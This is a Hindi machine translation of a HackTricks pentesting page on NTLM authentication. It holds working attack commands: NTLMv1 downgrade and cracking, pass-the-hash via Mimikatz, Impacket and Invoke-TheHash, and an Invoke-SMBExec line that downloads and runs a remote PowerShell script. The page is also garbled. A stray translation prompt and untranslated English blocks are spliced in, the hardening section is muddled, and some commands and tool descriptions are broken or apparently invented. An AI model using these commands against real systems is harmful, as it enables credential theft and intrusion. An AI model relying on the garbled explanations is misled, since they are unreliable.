# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>

## मूलभूत जानकारी

**NTLM क्रेडेंशियल्स**: डोमेन नाम (यदि कोई हो), उपयोगकर्ता नाम और पासवर्ड हैश।

**LM** केवल **Windows XP और सर्वर 2003** में **सक्षम** है (LM हैश को क्रैक किया जा सकता है)। LM हैश AAD3B435B51404EEAAD3B435B51404EE यह दर्शाता है कि LM का उपयोग नहीं हो रहा है (खाली स्ट्रिंग का LM हैश है)।

डिफ़ॉल्ट रूप से **Kerberos** का उपयोग होता है, इसलिए NTLM का उपयोग केवल तभी होगा जब **कोई Active Directory कॉन्फ़िगर नहीं होता है**, **डोमेन मौजूद नहीं होता है**, **Kerberos काम नहीं कर रहा होता है** (बुरी कॉन्फ़िगरेशन) या **क्लाइंट** जो IP का उपयोग करके वैध होस्ट-नाम की बजाय कनेक्ट करने की कोशिश करता है।

एक **NTLM प्रमाणीकरण** के **नेटवर्क पैकेट** में **हेडर** "**NTLMSSP**" होता है।

प्रोटोकॉल: LM, NTLMv1 और NTLMv2 को DLL %windir%\Windows\System32\msv1\_0.dll में समर्थित किया जाता है

## LM, NTLMv1 और NTLMv2

आप जांच और कॉन्फ़िगर कर सकते हैं कि कौन सा प्रोटोकॉल उपयोग होगा:

### GUI

_secpol.msc_ को निष्पादित करें -> स्थानीय नीतियाँ -> सुरक्षा विकल्प -> नेटवर्क सुरक्षा: LAN प्रबंधक प्रमाणीकरण स्तर। 6 स्तर हैं (0 से 5 तक).

![](<../../.gitbook/assets/image (92).png>)

### रजिस्ट्री

यह स्तर 5 सेट करेगा:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
संभावित मान:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## मूल NTLM डोमेन प्रमाणीकरण योजना

1. **उपयोगकर्ता** अपने **प्रमाणपत्र** प्रस्तुत करता है
2. क्लाइंट मशीन **प्रमाणीकरण अनुरोध** भेजती है और **डोमेन नाम** और **उपयोगकर्ता नाम** भेजती है
3. **सर्वर** चुनौती भेजता है
4. **क्लाइंट** चुनौती को **पासवर्ड की हैश** का उपयोग करके एन्क्रिप्ट करता है और इसे प्रतिक्रिया के रूप में भेजता है
5. **सर्वर** **डोमेन कंट्रोलर** को **डोमेन नाम, उपयोगकर्ता नाम, चुनौती और प्रतिक्रिया** भेजता है। यदि **कोई सक्रिय निर्देशिका** कॉन्फ़िगर नहीं है या डोमेन नाम सर्वर का नाम है, तो प्रमाणपत्र स्थानीय रूप से जांचे जाते हैं।
6. **डोमेन कंट्रोलर** जांचता है कि क्या सब कुछ सही है और सर्वर को जानकारी भेजता है

**सर्वर** और **डोमेन कंट्रोलर** को **नेटलॉगन** सर्वर के माध्यम से **सुरक्षित चैनल** बनाने की क्षमता होती है क्योंकि डोमेन कंट्रोलर को सर्वर का पासवर्ड पता होता है (यह **NTDS.DIT** डेटाबेस में होता है)।

### स्थानीय NTLM प्रमाणीकरण योजना

प्रमाणीकरण उसी तरह होता है जैसा **पहले उल्लिखित है लेकिन** **सर्वर** को **उपयोगकर्ता की हैश** का पता होता है जो **SAM** फ़ाइल में प्रमाणीकरण करने की कोशिश करता है। इसलिए, डोमेन कंट्रोलर की जगह पूछने की बजाय, **सर्वर खुद जांचेगा** कि क्या उपयोगकर्ता प्रमाणित कर सकता है।

### NTLMv1 चुनौती

**चुनौती की लंबाई 8 बाइट** होती है और **प्रतिक्रिया 24 बाइट** लंबी होती है।

**हैश NT (16 बाइट)** को **3 हिस्सों में बांटा जाता है, प्रत्येक 7 बाइट** का (7B + 7B + (2B+0x00\*5)): **अंतिम हिस्सा शून्यों से भरा होता है**। फिर, **चुनौती** को प्रत्येक हिस्से के साथ **अलग-अलग रूप में एन्क्रिप्ट किया जाता है** और **परिणामस्वरूप** एन्क्रिप्टेड बाइट्स **जोड़ी जाती हैं**। कुल: 8B + 8B + 8B = 24 बाइट।

**समस्याएं**:

* **यादृच्छिकता की कमी**
* 3 हिस्सों को **अलग-अलग हमला** किया जा सकता है ताकि NT हैश पता लगाया जा सके
* **DES को तोड़ा जा सकता है**
* 3 वें कुंजी में हमेशा **5 शून्य** होते हैं।
* **एक ही चुनौती** दिए जाने पर **प्रतिक्रिया** **समान** होगी। इसलिए, आप पीड़ित को **चुनौती** के रूप में स्ट्रिंग "**1122334455667788**" दे सकते हैं और प्रतिक्रिया को **पूर्व-गणित इंद्रधनुष** का उपयोग करके हमला कर सकते हैं।

### NTLMv1 हमला

आजकल अनियंत्रित निर्देशिका कॉन्फ़िगर के साथ वातावरण ढूंढ़ना कम हो रहा है, लेकिन इसका यह मतलब नहीं है कि आप **प्रिंट स्पूलर सेवा** का दुरुपयोग नहीं कर सकते।

आप AD पर पहले से ही कुछ प्रमाणपत्र / सत्रों का दुरुपयोग करके **प्रिंटर को प्रमाणीकृत करने** के लिए कुछ **अपने नियंत्रण के तहत होस्ट** के खिलाफ प्रमाणीकरण करने के लिए कह सकते हैं। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का उपयोग करके आप **प्रमाणीकरण चुनौती को 1122334455667788** पर सेट कर सकते हैं, प्रमाणीकरण प्रयास को कैप्चर कर सकते हैं, और यदि यह **NTLMv1** का उपयोग करके किया गया था तो आप इसे **तोड़ सकेंगे**।\
यदि आप `responder` का उपयोग कर रहे हैं तो आप **प्रमाणीकरण** को **डाउनग्रेड** करने के लिए **ध्वज `--lm`** का उपयोग करने की कोशिश कर सकते हैं।\
_ध्यान दें कि इस तकनीक के लिए प्रमाणीकरण को NTLMv1 का उपयोग करके किया जाना चाहिए (NTLMv2 मान्य नहीं है)।_

ध्यान दें कि प्रिंटर प्रमाणीकरण के दौरान कंप्यूटर खाता का उपयोग करेगा, और कंप्यूटर खाते में **लंबा और यादृच्छिक पासवर्ड** का उपयोग होता है जिसे आप **सामान्य शब्दकोश** का उपयोग करके **तोड़ने में सक्षम नहीं होंगे**। लेकिन **NTLMv1** प्रमाणीकरण **DES का उपयोग करता है** ([अधिक जानकारी यहां](./#ntlmv1-challenge)), इसलिए DES को तोड़ने के लिए कुछ विशेष सेवाओं का उपयोग करके आप इसे तोड़ सकेंगे (आप [https://crack.sh/](https://crack.sh) का उपयोग कर सकते हैं उदाहरण के लिए)।

### hashcat के साथ NTLMv1 हमला

NTLMv1 को एनटीएलएमवन मल्टी टूल [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) के साथ तोड़ा जा सकता है जो हैशकैट के साथ तोड़ा जा सकता है।

आदेश
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
``` would output the below:

```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# एनटीएलएम (NTLM) हार्डनिंग

एनटीएलएम (NTLM) एक प्रमुख प्रमाणीकरण प्रोटोकॉल है जो माइक्रोसॉफ्ट विंडोज प्लेटफ़ॉर्म पर उपयोग होता है। यह प्रोटोकॉल उपयोगकर्ता को उनके पहचान को सत्यापित करने के लिए उनके पासवर्ड का उपयोग करता है।

इस दस्तावेज़ में, हम एनटीएलएम प्रोटोकॉल के बारे में अधिक जानकारी प्रदान करेंगे और विंडोज प्लेटफ़ॉर्म पर एनटीएलएम को हार्डन करने के लिए कुछ सुरक्षा उपायों को समझाएंगे।

## विषय

1. [एनटीएलएम कार्यप्रणाली](#एनटीएलएम-कार्यप्रणाली)
2. [एनटीएलएम के सुरक्षा चुनौतियाँ](#एनटीएलएम-के-सुरक्षा-चुनौतियाँ)
3. [एनटीएलएम हार्डनिंग के लिए उपाय](#एनटीएलएम-हार्डनिंग-के-लिए-उपाय)
4. [संग्रहीत पाठ](#संग्रहीत-पाठ)

## एनटीएलएम कार्यप्रणाली

एनटीएलएम प्रोटोकॉल तीन चरणों में काम करता है:

1. **विन्यास (Negotiation)**: क्लाइंट और सर्वर के बीच प्रमाणीकरण प्रक्रिया शुरू होती है और विन्यास चरण में क्लाइंट और सर्वर एन्क्रिप्शन और हैश अल्गोरिदम के लिए समझौता करते हैं।
2. **चुनौती (Challenge)**: सर्वर एक चुनौती बनाता है और क्लाइंट को उसे हल करने के लिए अपने पासवर्ड का उपयोग करना होता है।
3. **पुष्टि (Authentication)**: क्लाइंट चुनौती का सही उत्तर देता है और सर्वर उपयोगकर्ता को सत्यापित करता है।

## एनटीएलएम के सुरक्षा चुनौतियाँ

एनटीएलएम के कुछ महत्वपूर्ण सुरक्षा चुनौतियाँ हैं:

1. **पाठ्यक्रम चुनौती (Pass-the-Hash)**: इसमें हैश वैल्यू को चुनौती के रूप में उपयोग किया जाता है जिससे हमेशा के लिए उपयोगकर्ता के खाते में प्रवेश किया जा सकता है।
2. **एनटीएलएम रिले अटैक (NTLM Relay Attack)**: इसमें हम एक बीचवाला होते हैं और एक सर्वर के साथ एक एनटीएलएम सत्यापन सत्र शुरू करते हैं, जिसे हम उस सर्वर के लिए उपयोगकर्ता के रूप में सत्यापित करने के लिए उपयोग कर सकते हैं।
3. **एनटीएलएम लीक (NTLM Leak)**: इसमें हम एनटीएलएम विन्यास चरण में एन्क्रिप्शन और हैश अल्गोरिदम के लिए अद्यतन कर सकते हैं और इसे उपयोगकर्ता के पासवर्ड को प्राप्त करने के लिए उपयोग कर सकते हैं।

## एनटीएलएम हार्डनिंग के लिए उपाय

एनटीएलएम को हार्डन करने के लिए निम्नलिखित उपायों का पालन करें:

1. **लॉकआउट नीति कॉन्फ़िगर करें**: लॉकआउट नीति को कॉन्फ़िगर करें ताकि अगर कोई उपयोगकर्ता निरंतर गलत पासवर्ड दर्ज करता है, तो उनका खाता लॉक हो जाए।
2. **NTLMv2 का उपयोग करें**: NTLMv2 का उपयोग करें जो एक बेहतर सुरक्षा स्तर प्रदान करता है और पाठ्यक्रम चुनौती को रोकने में मदद करता है।
3. **लॉकआउट नीति की जांच करें**: नियमित अंतराल पर लॉकआउट नीति की जांच करें और उन्हें अद्यतित रखें।
4. **एनटीएलएम विन्यास को अद्यतित करें**: नवीनतम सुरक्षा अद्यतनों के साथ एनटीएलएम विन्यास को अद्यतित करें ताकि किसी भी नई सुरक्षा चुनौती से बचा जा सके।

## संग्रहीत पाठ

इस दस्तावेज़ में हमने एनटीएलएम प्रोटोकॉल के बारे में जानकारी प्रदान की है और विंडोज प्लेटफ़ॉर्म पर एनटीएलएम को हार्डन करने के लिए कुछ सुरक्षा उपायों को समझाया है। यदि आप अधिक जानकारी चाहते हैं, तो कृपया इस दस्तावेज़ के संदर्भ स्रोतों का उपयोग करें।
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
यह कई दिन लगा सकता है, इसलिए हैशकैट (hashtopolis जैसे एक टूल के माध्यम से वितरित करना सबसे अच्छा है) चलाएं।
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
इस मामले में हमें इसका पासवर्ड पता है जो password है, इसलिए हम डेमो के लिए धोखा देंगे:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
अब हमें हैशकैट-उपयोगिताओं का उपयोग करके क्रैक किए गए DES कुंजी को NTLM हैश के भाग में बदलने की आवश्यकता है:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
अंत में आखिरकार आखिरी भाग
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
निम्नलिखित हैंडबुक से एक हैकिंग तकनीक के बारे में सामग्री है। निम्नलिखित सामग्री windows-hardening/ntlm/README.md फ़ाइल से है। अंग्रेजी में दिए गए पाठ का हिंदी में अनुवाद करें और अनुवाद को वही मार्कडाउन और HTML सिंटैक्स के साथ वापस लौटाएं। कोड, हैकिंग तकनीक के नाम, हैकिंग शब्द, क्लाउड / SaaS प्लेटफ़ॉर्म के नाम (जैसे Workspace, aws, gcp ...), 'leak' शब्द, पेंटेस्टिंग और मार्कडाउन टैग्स जैसी चीजें अनुवाद न करें। इसके अलावा अतिरिक्त कुछ भी न जोड़ें, केवल अनुवाद और मार्कडाउन सिंटैक्स रखें।

```markdown
# NTLM Relay Attack

The NTLM relay attack is a technique used to exploit the NTLM authentication protocol in Windows environments. It allows an attacker to intercept and relay authentication requests between a client and a target server, gaining unauthorized access to the target system.

## How it works

1. The attacker sets up a rogue server and waits for a client to connect.
2. When the client sends an authentication request to the rogue server, the server relays the request to the target server.
3. The target server responds to the rogue server with an authentication challenge.
4. The rogue server relays the challenge back to the client.
5. The client sends the challenge response to the rogue server, which relays it to the target server.
6. The target server verifies the response and grants access to the rogue server, thinking it is the client.
7. The attacker can now perform actions on the target system using the compromised credentials.

## Mitigation

To protect against NTLM relay attacks, follow these best practices:

- Disable NTLM authentication and use Kerberos or other secure authentication protocols.
- Implement SMB signing to ensure the integrity of SMB communications.
- Enable Extended Protection for Authentication to prevent downgrade attacks.
- Use strong, complex passwords to make it harder for attackers to crack them.
- Regularly update and patch Windows systems to fix any security vulnerabilities.

By following these steps, you can significantly reduce the risk of NTLM relay attacks and enhance the security of your Windows environment.
```

```html
<h1>NTLM Relay Attack</h1>

<p>The NTLM relay attack is a technique used to exploit the NTLM authentication protocol in Windows environments. It allows an attacker to intercept and relay authentication requests between a client and a target server, gaining unauthorized access to the target system.</p>

<h2>How it works</h2>

<ol>
<li>The attacker sets up a rogue server and waits for a client to connect.</li>
<li>When the client sends an authentication request to the rogue server, the server relays the request to the target server.</li>
<li>The target server responds to the rogue server with an authentication challenge.</li>
<li>The rogue server relays the challenge back to the client.</li>
<li>The client sends the challenge response to the rogue server, which relays it to the target server.</li>
<li>The target server verifies the response and grants access to the rogue server, thinking it is the client.</li>
<li>The attacker can now perform actions on the target system using the compromised credentials.</li>
</ol>

<h2>Mitigation</h2>

<p>To protect against NTLM relay attacks, follow these best practices:</p>

<ul>
<li>Disable NTLM authentication and use Kerberos or other secure authentication protocols.</li>
<li>Implement SMB signing to ensure the integrity of SMB communications.</li>
<li>Enable Extended Protection for Authentication to prevent downgrade attacks.</li>
<li>Use strong, complex passwords to make it harder for attackers to crack them.</li>
<li>Regularly update and patch Windows systems to fix any security vulnerabilities.</li>
</ul>

<p>By following these steps, you can significantly reduce the risk of NTLM relay attacks and enhance the security of your Windows environment.</p>
```
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 चैलेंज

**चैलेंज की लंबाई 8 बाइट होती है** और **2 रिस्पॉन्स** भेजे जाते हैं: एक **24 बाइट** लंबा होता है और **दूसरा** की लंबाई **चरणात्मक** होती है।

**पहला रिस्पॉन्स** उस **स्ट्रिंग** को **HMAC\_MD5** का उपयोग करके चाइफर करके बनाया जाता है जिसमें **क्लाइंट और डोमेन** शामिल होते हैं और **कुंजी** के रूप में **NT हैश** का **हैश MD4** का उपयोग किया जाता है। फिर, **परिणाम** को **कुंजी** के रूप में उपयोग करके चाइफर करने के लिए **चैलेंज** का उपयोग किया जाएगा। इसके लिए, **8 बाइट का क्लाइंट चैलेंज जोड़ा जाएगा**। कुल: 24 B।

**दूसरा रिस्पॉन्स** उपयोग करके बनाया जाता है **कई मानों** का (नया क्लाइंट चैलेंज, **टाइमस्टैम्प** रिप्ले अटैक से बचने के लिए...)

यदि आपके पास एक **pcap है जिसने एक सफल प्रमाणीकरण प्रक्रिया को कैप्चर किया है**, तो आप इस गाइड का पालन करके डोमेन, उपयोगकर्ता नाम, चैलेंज और रिस्पॉन्स प्राप्त कर सकते हैं और पासवर्ड को क्रैक करने का प्रयास कर सकते हैं: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## हैश पास करें

**जब आपके पास पीड़ित का हैश होता है**, तो आप इसका उपयोग करके उसे **अनुकरण** कर सकते हैं।
आपको एक **टूल** का उपयोग करना होगा जो उस **हैश** का उपयोग करके **NTLM प्रमाणीकरण को करेगा**, **या** आप एक नया **सत्रलॉगिन** बना सकते हैं और उस **हैश** को **LSASS** में **इंजेक्ट** कर सकते हैं, ताकि जब कोई **NTLM प्रमाणीकरण किया जाता है**, तो वह **हैश का उपयोग होगा**। आखिरी विकल्प है वही करता है जो mimikatz करता है।

**कृपया ध्यान दें कि आप कंप्यूटर खातों का उपयोग करके भी पास-द-हैश हमले कर सकते हैं।**

### **Mimikatz**

**इसे व्यवस्थापक के रूप में चलाना चाहिए**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
यह एक प्रक्रिया शुरू करेगा जो मिमीकैट्स लॉन्च करने वाले उपयोगकर्ताओं के नाम होगी, लेकिन LSASS में सहेजे गए क्रेडेंशियल्स मिमीकैट्स पैरामीटर्स के अंदर होंगे। फिर, आप उस उपयोगकर्ता के रूप में नेटवर्क संसाधनों तक पहुंच सकते हैं (`runas /netonly` ट्रिक के समान, लेकिन आपको प्लेन-टेक्स्ट पासवर्ड को जानने की आवश्यकता नहीं होती है)।

### लिनक्स से पास-द-हैश

आप लिनक्स से पास-द-हैश का उपयोग करके विंडोज मशीनों में कोड निष्पादन प्राप्त कर सकते हैं।\
[**यहां जानने के लिए एक्सेस करें।**](../../windows/ntlm/broken-reference/)

### Impacket विंडोज कंपाइल्ड टूल्स

आप यहां से विंडोज के लिए impacket बाइनरी डाउनलोड कर सकते हैं: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (इस मामले में आपको एक कमांड निर्दिष्ट करनी होगी, cmd.exe और powershell.exe एक इंटरैक्टिव शेल प्राप्त करने के लिए मान्य नहीं हैं) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* और भी कई Impacket बाइनरी हैं...

### Invoke-TheHash

आप यहां से पावरशेल स्क्रिप्ट प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### इनवोक-डब्ल्यूएमआईएक्सेक्यूट

यह टेक्निक एक पावरशेल स्क्रिप्ट है जिसका उपयोग विंडोज सिस्टम पर एनटीएलएम एक्सेक्यूशन को शुरू करने के लिए किया जाता है। यह टेक्निक एक रिमोट मशीन पर एक्सेक्यूशन को संभव बनाती है जब एक वैध उपयोगकर्ता क्रेडेंशियल्स उपलब्ध होती हैं। यह टेक्निक एक एनटीएलएम हैश का उपयोग करती है जो उपयोगकर्ता के पासवर्ड को सुरक्षित रूप से संग्रहीत करता है और उपयोगकर्ता के नाम और पासवर्ड को रिमोट मशीन पर भेजती है। इस तरीके का उपयोग करके, हैकर रिमोट मशीन पर एक्सेक्यूशन को प्राप्त कर सकता है और उसके लिए विशेषाधिकार प्राप्त कर सकता है।

उदाहरण:
```powershell
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd
```

इस उदाहरण में, हम विंडोज सिस्टम 192.168.1.100 पर एनटीएलएम एक्सेक्यूशन शुरू करने के लिए `Invoke-WMIExec` कमांड का उपयोग कर रहे हैं। यहां, `Administrator` उपयोगकर्ता नाम और `P@ssw0rd` पासवर्ड क्रेडेंशियल्स के रूप में उपयोग हो रहे हैं।
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### इन्वोक-एसएमबीक्लाइंट

```powershell
Invoke-SMBClient -Target <target> -Username <username> -Password <password> -Command <command>
```

यह आदेश एक विशिष्ट उपयोगकर्ता क्रेडेंशियल का उपयोग करके एक SMB क्लाइंट के रूप में विशिष्ट लक्ष्य के साथ संचार स्थापित करता है। यह आपको SMB सर्वर के साथ फ़ाइल संचार, फ़ाइल डाउनलोड और अन्य संचार कार्रवाई करने की अनुमति देता है। आपको लक्ष्य के लिए उपयोगकर्ता नाम, पासवर्ड और आदेश की आवश्यकता होती है।
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### इन्वोक-एसएमबीईनम

```plaintext
Invoke-SMBEnum is a PowerShell script that can be used to enumerate information from SMB services. It can be used to gather information such as user accounts, shares, and sessions from remote SMB servers.

Usage:
Invoke-SMBEnum -Target <target> [-Port <port>] [-Credential <credential>] [-Verbose]

Parameters:
- Target: The IP address or hostname of the target SMB server.
- Port: The port number on which the SMB service is running (default is 445).
- Credential: The credentials to use for authentication (optional).
- Verbose: Enable verbose output (optional).

Example:
Invoke-SMBEnum -Target 192.168.1.100 -Credential (Get-Credential)
```

इन्वोक-एसएमबीईनम एक पावरशेल स्क्रिप्ट है जिसका उपयोग एसएमबी सेवाओं से जानकारी निरूपित करने के लिए किया जा सकता है। यह दूरस्थ एसएमबी सर्वर से उपयोगकर्ता खाते, साझा और सत्र जैसी जानकारी इकट्ठा करने के लिए उपयोग किया जा सकता है।

उपयोग:
Invoke-SMBEnum -Target <target> [-Port <port>] [-Credential <credential>] [-Verbose]

पैरामीटर:
- Target: लक्षित एसएमबी सर्वर का आईपी पता या होस्टनाम।
- Port: एसएमबी सेवा चल रही है उस पोर्ट नंबर (डिफ़ॉल्ट 445)।
- Credential: प्रमाणीकरण के लिए उपयोग करने के लिए क्रेडेंशियल (वैकल्पिक)।
- Verbose: वर्बोस आउटपुट सक्षम करें (वैकल्पिक)।

उदाहरण:
Invoke-SMBEnum -Target 192.168.1.100 -Credential (Get-Credential)
```
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

यह फ़ंक्शन **अन्य सभी** का **मिश्रण है**। आप **कई होस्ट** को **पास कर सकते हैं**, किसी को **छोड़ सकते हैं** और आपको उपयोग करने के लिए **विकल्प** का **चयन** कर सकते हैं (_SMBExec, WMIExec, SMBClient, SMBEnum_)। यदि आप **SMBExec** और **WMIExec** में से **किसी भी** का चयन करते हैं लेकिन आप **कोई** _**Command**_ पैरामीटर नहीं देते हैं, तो यह केवल यह **जांचेगा** कि क्या आपके पास **पर्याप्त अनुमतियाँ** हैं।
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [ईविल-विनआरएम पास द हैश](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### विंडोज क्रेडेंशियल्स संपादक (डब्ल्यूसीई)

**व्यवस्थापक के रूप में चलाने की आवश्यकता है**

यह टूल mimikatz की तरही काम करेगा (एलएसएस मेमोरी को संशोधित करेगा)।
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### उपयोगकर्ता नाम और पासवर्ड के साथ मैनुअल Windows रिमोट निष्पादन

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## एक Windows होस्ट से क्रेडेंशियल्स निकालना

**अधिक जानकारी के लिए** [**एक Windows होस्ट से क्रेडेंशियल्स प्राप्त करने के बारे में आपको इस पेज को पढ़ना चाहिए**](broken-reference)**.**

## NTLM रिले और रिस्पॉन्डर

**इन हमलों को कैसे करें, इसके बारे में अधिक विस्तृत गाइड पढ़ें:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## नेटवर्क कैप्चर से NTLM चुनौतियों को पार्स करें

**आप इसका उपयोग कर सकते हैं** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी में काम करते हैं**? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**
